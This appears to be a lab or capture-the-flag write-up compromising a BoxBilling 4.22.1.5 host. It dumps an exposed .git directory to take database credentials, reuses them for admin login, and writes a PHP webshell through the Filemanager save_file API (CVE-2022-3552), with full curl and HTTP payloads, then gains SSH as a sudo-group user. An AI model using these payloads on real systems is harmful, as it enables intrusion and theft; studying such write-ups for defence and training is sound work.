# BoxBilling

BoxBilling is an open-source billing and client management application. In the observed path, an exposed `.git` directory leaked `bb-config.php` database credentials that also worked for the BoxBilling admin login, leading to authenticated file write RCE through `CVE-2022-3552`.

## Discovery

WhatWeb against the hostname may show BoxBilling:

```text
Apache[2.4.52], Cookies[PHPSESSID], HTML5, HttpOnly[PHPSESSID], JQuery, PasswordField[password], PoweredBy[BoxBilling], Title[Client Area]
```

If browsing by IP redirects to a hostname, add it locally:

```text
TARGET bullybox.local
```

Useful paths:

```text
http://bullybox.local/login
http://bullybox.local/login?&register=1
http://bullybox.local/order
http://bullybox.local/bb-admin/staff/login
```

The staff login page disclosed the version:

```text
Powered by BoxBilling 4.22.1.5
```

Nmap HTTP scripts may also reveal BoxBilling paths:

```text
http-robots.txt:
  /boxbilling/bb-data/ /bb-data/ /bb-library/
  /bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/

http-enum:
  /bb-admin/index.php
  /bb-admin/login.php
  /robots.txt
  /.git/HEAD
  /api/
```

## Exposed Git Credentials

Dump the exposed repository and inspect `bb-config.php`:

```bash
python3 git_dumper.py http://bullybox.local /tmp/bullybox-repo
cat /tmp/bullybox-repo/bb-config.php
```

Useful values:

```php
'db' =>
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'passwordhere',
  ),
```

The database password also worked for the BoxBilling admin login:

```text
admin@bullybox.local:passwordhere
```

## Authenticated File Write RCE

Searchsploit identified the authenticated RCE:

```text
BoxBilling<=4.22.1.5 - Remote Code Execution (RCE) | php/webapps/51108.txt
```

The vulnerable endpoint writes files through the admin Filemanager API:

```http
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Cookie: PHPSESSID=SESSION
Content-Type: application/x-www-form-urlencoded

order_id=1&path=shell.php&data=<?php system($_GET["cmd"]); ?>
```

Confirm authenticated access to the endpoint:

```bash
curl -i "http://bullybox.local/index.php?_url=/api/admin/Filemanager/save_file" -H "Cookie: PHPSESSID=SESSION"
```

Useful successful response when the session is valid:

```json
{"result":null,"error":{"message":"Path parameter is missing","code":9999}}
```

Write a PHP command shell:

```bash
curl -X POST "http://bullybox.local/index.php?_url=/api/admin/Filemanager/save_file" \
  -H "Cookie: PHPSESSID=SESSION" \
  -d 'order_id=1&path=c.php&data=<?php system($_GET["cmd"]); ?>'
```

Trigger command execution:

```text
http://bullybox.local/c.php?cmd=id
```

Successful execution context:

```text
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
```

## SSH Access as yuki

Outbound reverse shell callbacks were blocked, so use the webshell-to-SSH-key fallback to connect as `yuki`. See [Shells](../shells/shells.md#web-shell-to-ssh-when-reverse-shells-fail).

Successful SSH command:

```bash
ssh yuki@bullybox.local -i ~/.ssh/id_ed25519
```

Successful shell context:

```text
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 GNU/Linux
pwd
/home/yuki
```

